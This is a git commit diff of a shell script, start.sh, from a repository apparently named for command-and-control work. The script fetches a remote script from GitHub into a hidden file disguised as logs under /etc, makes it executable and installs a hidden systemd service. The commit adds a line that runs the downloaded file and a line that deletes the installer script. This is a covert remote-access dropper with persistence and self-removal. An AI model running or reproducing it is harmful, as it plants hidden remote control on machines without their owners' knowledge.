02fef237310108ffda80ba0df441b1275aa3a63f
AidanNgo <115433593+AidanNgo@users.noreply.github.com>
2026-03-25 22:24:51 -0500

    Update start.sh

--- start.sh
+++ start.sh
@@ -1,6 +1,5 @@
 curl -sL https://raw.githubusercontent.com/AidanNgo/eh-command-control/refs/heads/main/logs.sh > /etc/.python-logs
 chmod +x /etc/.python-logs
+python /etc/.python-logs
 curl -sL https://raw.githubusercontent.com/AidanNgo/eh-command-control/refs/heads/main/logs.service > /etc/systemd/system/.python-logs.service
-systemctl daemon-reload
-systemctl enable python-logs
-systemctl start python-logs
+rm start.sh
